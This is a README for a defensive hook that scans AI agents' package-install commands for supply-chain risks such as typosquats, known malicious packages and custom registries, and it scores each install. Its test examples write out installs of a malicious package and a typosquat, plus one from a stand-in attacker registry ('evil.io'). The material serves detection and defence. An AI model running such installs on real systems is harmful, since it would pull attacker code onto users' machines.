# supply-guard-hook

Supply chain attack protection for AI agent harnesses. Intercepts package install commands before they execute and evaluates them for supply chain risks — typosquatting, known malicious packages, suspiciously new packages, custom registry overrides, and more.

Companion to [`supply-guard-proxy`](https://gitlab.rsolabs.com/ai/supply-guard-proxy) which handles HTTP-level interception.

## What it protects against

- **Known malicious packages** — curated database of confirmed supply chain attacks
- **Typosquatting** — packages with names 1-2 edits away from popular packages (`requets` vs `requests`, `boto4` vs `boto3`)
- **New/unpopular packages** — flags packages published < 7 days ago or with very low download counts
- **Custom registry overrides** — `--index-url`, `--registry` flags that bypass official vetting
- **Git URL installs** — GitHub repos with very few stars
- **Exec-mode packages** — `npx`/`bunx` commands that execute packages directly

## Supported package managers

| Manager | Commands intercepted |
|---------|---------------------|
| pip / pip3 | `pip install`, `pip download`, `pip wheel`, `-r requirements.txt` |
| npm | `npm install`, `npm i`, `npm add` |
| bun | `bun add`, `bunx` |
| npx | `npx <package>` |
| yarn | `yarn add` |
| pnpm | `pnpm add` |
| cargo | `cargo add`, `cargo install` |
| gem | `gem install` |

## Quick start

### Claude Code hook (recommended)

Add to your `~/.claude/settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bun /path/to/supply-guard-hook/src/hooks/SupplyGuard.hook.ts"
          }
        ]
      }
    ]
  }
}
```

That's it. Every Bash tool call in Claude Code will now be scanned before execution.

### Test a command

```bash
bun src/cli/review.ts test "pip install coloama"
# → BLOCK: Known malicious package

bun src/cli/review.ts test "pip install requets"
# → APPROVE: Possible typosquat of `requests` (edit distance 1)

bun src/cli/review.ts test "pip install requests"
# → ALLOW

bun src/cli/review.ts test "npx create-react-app ."
# → ALLOW (with exec-mode note)

bun src/cli/review.ts test "pip install mylib --index-url https://evil.io/simple/"
# → APPROVE or BLOCK depending on other signals (custom registry +60 score)
```

### View audit logs

```bash
bun src/cli/review.ts logs --tail 20
bun src/cli/review.ts logs --decision block
bun src/cli/review.ts stats
```

## How it works

```
Command → Parser → [ThreatDB, Typosquatting, Metadata] → Score → Decision
```

Each package in the install command is scored 0–100:

| Check | Max score | Notes |
|-------|-----------|-------|
| Known malicious DB | 100 | Short-circuits immediately |
| Typosquatting (edit distance 1) | 75 | Levenshtein vs top 200 packages |
| Typosquatting (edit distance 2) | 40 | |
| Package < 7 days old | 50 | PyPI/npm registry API |
| Package < 30 days old | 20 | |
| < 100 weekly downloads | 40 | |
| < 1,000 weekly downloads | 25 | |
| Custom registry flag | 60 | `--index-url`, `--registry` |
| npx/bunx exec mode | 20 | Downloads and executes |
| GitHub repo < 10 stars | 30 | For git+https:// installs |

**Default thresholds** (configurable in `policies/default.yaml`):
- Score ≥ 80 → **BLOCK** (exit code 2, Claude Code rejects the command)
- Score 40–79 → **APPROVE** (Claude Code asks you to confirm)
- Score < 40 → **ALLOW**

## Installation

```bash
git clone ssh://git@gitlab.rsolabs.com:223/ai/supply-guard-hook.git
cd supply-guard-hook
bun install
bun test
```

Requires [Bun](https://bun.sh) runtime.

## Development

```bash
bun test                    # run all tests
bun test tests/parser.test.ts  # run specific test file
bun src/cli/review.ts test "pip install coloama"
```

### Adding malicious packages

Edit `src/threats/knownMalicious.ts` and add entries under `pip` or `npm`:

```typescript
{ name: "evil-pkg", reason: "Backdoor — exfiltrates credentials (2026-05)" }
```

### Updating popular packages list

Edit `src/threats/popularPackages.ts`. These are used for typosquatting detection — add any widely-used package that could be typosquatted.

## Security model

**Defense-in-depth**: This hook adds a security layer but is not a complete solution.

**Assumptions:**
- The AI agent must use the Claude Code hook system (or equivalent) for this to intercept commands
- An agent that calls tools without going through the hook is not protected
- The metadata checks (age, downloads) require internet access and fail-open on network errors
- The known-malicious DB requires manual updates to stay current

**Limitations:**
- Cannot detect novel malicious packages not in the DB
- Typosquatting detection can produce false positives for legitimate obscure packages
- Metadata checks are rate-limited by PyPI/npm — aggressive use may hit limits
- This does not replace proper sandboxing or network egress controls

**Complementary controls:**
- Run agents in containers with minimal permissions
- Use `supply-guard-proxy` for HTTP-level package download inspection
- Review audit logs at `~/.supplyguard/logs/` regularly

## License

MIT
